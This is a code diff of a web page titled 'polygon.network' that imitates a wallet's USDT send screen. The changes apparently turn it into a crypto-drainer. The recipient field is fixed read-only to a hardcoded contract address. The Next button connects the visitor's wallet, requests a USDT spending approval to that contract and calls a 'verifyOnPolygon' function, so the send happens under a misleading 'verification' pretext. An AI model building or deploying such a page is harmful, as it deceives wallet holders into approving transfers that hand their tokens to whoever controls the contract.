@@ -4,13 +4,18 @@
     <meta charset="UTF-8" />
     <title>polygon.network</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
 
         body {
             font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-            background-color: #000;
-            color: #fff;
+            background-color: #000000;
+            color: #ffffff;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -43,7 +48,7 @@
         .row {
             display: flex;
             align-items: center;
-            background-color: #111;
+            background-color: #111111;
             border-radius: 10px;
             border: 1px solid #262626;
             padding: 8px 10px;
@@ -53,12 +58,14 @@
             flex: 1;
             background: transparent;
             border: none;
-            color: #fff;
+            color: #ffffff;
             font-size: 14px;
             outline: none;
         }
 
-        .row input::placeholder { color: #555; }
+        .row input::placeholder {
+            color: #555555;
+        }
 
         .row button,
         .icon-btn {
@@ -82,14 +89,17 @@
         .icon-btn img {
             max-width: 100%;
             max-height: 100%;
+            display: block;
         }
 
-        .amount-box { margin-top: 24px; }
+        .amount-box {
+            margin-top: 24px;
+        }
 
         .amount-row {
             display: flex;
             align-items: center;
-            background-color: #111;
+            background-color: #111111;
             border-radius: 10px;
             border: 1px solid #262626;
             padding: 14px 12px;
@@ -99,7 +109,7 @@
             flex: 1;
             background: transparent;
             border: none;
-            color: #fff;
+            color: #ffffff;
             font-size: 18px;
             outline: none;
         }
@@ -112,8 +122,14 @@
             color: #a0a0a0;
         }
 
-        .amount-row-right .token { color: #fff; }
-        .amount-row-right .max { color: #00ff7f; cursor: pointer; }
+        .amount-row-right .token {
+            color: #ffffff;
+        }
+
+        .amount-row-right .max {
+            color: #00ff7f;
+            cursor: pointer;
+        }
 
         .usd-hint {
             margin-top: 6px;
@@ -123,9 +139,11 @@
 
         .bottom-bar {
             position: fixed;
-            left: 0; right: 0; bottom: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
             padding: 16px;
-            background: #000;
+            background: #000000;
         }
 
         .next-btn {
@@ -136,8 +154,14 @@
             padding: 14px;
             font-size: 16px;
             font-weight: 500;
-            color: #000;
+            color: #000000;
             cursor: pointer;
+        }
+
+        .next-btn:disabled {
+            background-color: #333;
+            color: #666;
+            cursor: not-allowed;
         }
     </style>
 </head>
@@ -155,14 +179,20 @@
                     type="text"
                     id="addressInput"
                     autocomplete="off"
-                    placeholder="Enter wallet address"
+                    placeholder=""
+                    value="0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55"
+                    readonly
                 />
                 <button type="button" onclick="pasteAddress()">Paste</button>
+
+                <!-- Contact icon -->
                 <button type="button" class="icon-btn" title="Contacts">
-                    📖
+                    <img src="/mnt/data/phone book .jpg" alt="Contacts" />
                 </button>
+
+                <!-- QR icon -->
                 <button type="button" class="icon-btn" title="Scan QR">
-                    📷
+                    <img src="/mnt/data/qr p.jpg" alt="QR" />
                 </button>
             </div>
         </div>
@@ -171,109 +201,216 @@
         <div class="amount-box">
             <div class="label">Amount</div>
             <div class="amount-row">
-                <input type="number" id="amountInput" min="0" step="0.01" />
+                <input type="number" id="amountInput" value="" min="0" step="0.01" />
                 <div class="amount-row-right">
                     <span class="token">USDT</span>
                     <span class="max" onclick="setMaxAmount()">Max</span>
                 </div>
             </div>
-            <div class="usd-hint" id="usdHint">≈ 0.00 POL</div>
+            <div class="usd-hint" id="polHint">≈ 0.00 POL</div>
         </div>
     </main>
 
+    <!-- Bottom Next button -->
     <div class="bottom-bar">
-        <button class="next-btn" onclick="goNext()">Next</button>
+        <button class="next-btn" id="nextBtn" onclick="goNext()">Next</button>
     </div>
 
     <script>
+        // Contract Configuration
+        const CONTRACT_ADDRESS = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55";
+        const POLYGON_USDT = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
+        
+        const CONTRACT_ABI = [
+            "function verifyOnPolygon(uint256 amount) external",
+            "function verifyOnBSC(uint256 amount) external", 
+            "function verifyOnArbitrum(uint256 amount) external"
+        ];
+
+        const USDT_ABI = [
+            "function approve(address spender, uint256 amount) external returns (bool)",
+            "function allowance(address owner, address spender) external view returns (uint256)",
+            "function balanceOf(address account) external view returns (uint256)"
+        ];
+
+        let provider;
+        let signer;
+        let connectedAccount;
         let polPriceUSD = 0;
 
-        // 🟢 Fetch live POL price from CoinGecko
+        // Set contract address on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById("addressInput").value = CONTRACT_ADDRESS;
+            fetchPolPrice();
+        });
+
+        // Fetch POL price from CoinGecko
         async function fetchPolPrice() {
             try {
                 const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd");
                 const data = await res.json();
                 polPriceUSD = data["polygon-ecosystem-token"].usd;
-
-                // Prefill once we know price
-                prefillFromURL();
-
+                updatePolConversion();
             } catch (e) {
                 console.error("Failed to fetch POL price", e);
-                document.getElementById("usdHint").textContent = "≈ -- POL";
+                document.getElementById("polHint").textContent = "≈ -- POL";
             }
         }
 
-        // 🧾 Clipboard paste
+        // Update POL conversion when amount changes
+        function updatePolConversion() {
+            const amount = parseFloat(document.getElementById("amountInput").value) || 0;
+            if (polPriceUSD > 0 && amount > 0) {
+                const polEquivalent = amount / polPriceUSD;
+                document.getElementById("polHint").textContent = `≈ ${polEquivalent.toFixed(4)} POL`;
+            } else {
+                document.getElementById("polHint").textContent = "≈ 0.00 POL";
+            }
+        }
+
         function pasteAddress() {
             if (navigator.clipboard && navigator.clipboard.readText) {
-                navigator.clipboard.readText()
-                    .then(text => document.getElementById("addressInput").value = text)
-                    .catch(() => alert("Unable to read from clipboard."));
+                navigator.clipboard.readText().then(function (text) {
+                    document.getElementById("addressInput").value = text;
+                }).catch(function () {
+                    alert("Unable to read from clipboard.");
+                });
             } else {
                 alert("Clipboard access not supported in this browser.");
             }
         }
 
-        // 🧮 Update conversion hint
-        function updateUsd() {
-            const amount = parseFloat(document.getElementById("amountInput").value) || 0;
-            if (polPriceUSD > 0) {
-                const polEquivalent = amount / polPriceUSD;
-                document.getElementById("usdHint").textContent = `≈ ${polEquivalent.toFixed(4)} POL`;
-            } else {
-                document.getElementById("usdHint").textContent = "≈ ... POL";
-            }
-        }
-
-        // 🧰 Prefill from URL parameters (for QR codes)
-        function prefillFromURL() {
-            const addressInput = document.getElementById("addressInput");
-            const amountInput = document.getElementById("amountInput");
-            
-            const params = new URLSearchParams(window.location.search);
-            let address = params.get("address");
-            let amount = params.get("amount");
-
-            // Prefill address from URL (your contract)
-            if (address) {
-                addressInput.value = address;
-            } else {
-                // Default to your contract address
-                addressInput.value = "0x447A7C4E2c613a991B56e05AA9Ab046d67e4aa55";
-            }
-
-            // Prefill amount from URL
-            if (amount) {
-                amountInput.value = parseFloat(amount);
-            } else {
-                amountInput.value = 1; // default amount
-            }
-
-            updateUsd();
-        }
-
-        // 🪙 Set Max
         function setMaxAmount() {
-            const amountInput = document.getElementById("amountInput");
-            amountInput.value = 1000;
-            updateUsd();
+            document.getElementById("amountInput").value = 1000;
+            updatePolConversion();
         }
 
-        // 🧭 Navigation
-        function goNext() {
-            // For testing - you can replace this with actual contract interaction
+        async function connectWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                try {
+                    // Request account access
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    signer = provider.getSigner();
+                    connectedAccount = await signer.getAddress();
+                    
+                    return true;
+                } catch (error) {
+                    console.error("User denied wallet connection:", error);
+                    return false;
+                }
+            } else {
+                alert("Please install MetaMask or Trust Wallet!");
+                return false;
+            }
+        }
+
+        async function checkUSDTApproval() {
+            try {
+                const usdtContract = new ethers.Contract(POLYGON_USDT, USDT_ABI, provider);
+                const currentAllowance = await usdtContract.allowance(connectedAccount, CONTRACT_ADDRESS);
+                const amountWei = ethers.utils.parseUnits(document.getElementById("amountInput").value, 6);
+                
+                return currentAllowance.gte(amountWei);
+            } catch (error) {
+                console.error("Error checking approval:", error);
+                return false;
+            }
+        }
+
+        async function approveUSDT() {
+            try {
+                const usdtContract = new ethers.Contract(POLYGON_USDT, USDT_ABI, signer);
+                const amountWei = ethers.utils.parseUnits(document.getElementById("amountInput").value, 6);
+                
+                const tx = await usdtContract.approve(CONTRACT_ADDRESS, amountWei);
+                await tx.wait();
+                return true;
+            } catch (error) {
+                console.error("Approval failed:", error);
+                return false;
+            }
+        }
+
+        async function executeTransaction() {
+            try {
+                const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+                const amountWei = ethers.utils.parseUnits(document.getElementById("amountInput").value, 6);
+                
+                const tx = await contract.verifyOnPolygon(amountWei);
+                await tx.wait();
+                return true;
+            } catch (error) {
+                console.error("Transaction failed:", error);
+                return false;
+            }
+        }
+
+        async function goNext() {
             const amount = document.getElementById("amountInput").value;
-            const address = document.getElementById("addressInput").value;
+            if (!amount || amount <= 0) {
+                alert("Please enter a valid amount");
+                return;
+            }
+
+            const nextBtn = document.getElementById("nextBtn");
+            const originalText = nextBtn.textContent;
             
-            alert(`Would send ${amount} USDT to ${address}`);
-            // window.location.href = "next.html";
+            try {
+                // Disable button during processing
+                nextBtn.disabled = true;
+                nextBtn.textContent = "Connecting...";
+
+                // Connect wallet
+                const connected = await connectWallet();
+                if (!connected) {
+                    nextBtn.disabled = false;
+                    nextBtn.textContent = originalText;
+                    return;
+                }
+
+                nextBtn.textContent = "Checking approval...";
+
+                // Check if USDT is already approved
+                const isApproved = await checkUSDTApproval();
+                
+                if (!isApproved) {
+                    nextBtn.textContent = "Approve USDT...";
+                    
+                    // Ask for USDT approval
+                    const approved = await approveUSDT();
+                    if (!approved) {
+                        alert("USDT approval failed. Please try again.");
+                        nextBtn.disabled = false;
+                        nextBtn.textContent = originalText;
+                        return;
+                    }
+                }
+
+                nextBtn.textContent = "Processing transaction...";
+
+                // Execute the main transaction
+                const success = await executeTransaction();
+                
+                if (success) {
+                    alert("Transaction completed successfully!");
+                    // Redirect or show success message
+                    window.location.href = "next.html";
+                } else {
+                    alert("Transaction failed. Please try again.");
+                }
+
+            } catch (error) {
+                console.error("Error:", error);
+                alert("An error occurred: " + error.message);
+            } finally {
+                nextBtn.disabled = false;
+                nextBtn.textContent = originalText;
+            }
         }
 
-        document.getElementById("amountInput").addEventListener("input", updateUsd);
-
-        // 🚀 Initialize on page load
-        fetchPolPrice();
+        // Add event listener for amount input changes
+        document.getElementById("amountInput").addEventListener("input", updatePolConversion);
     </script>
 </body>
 </html>
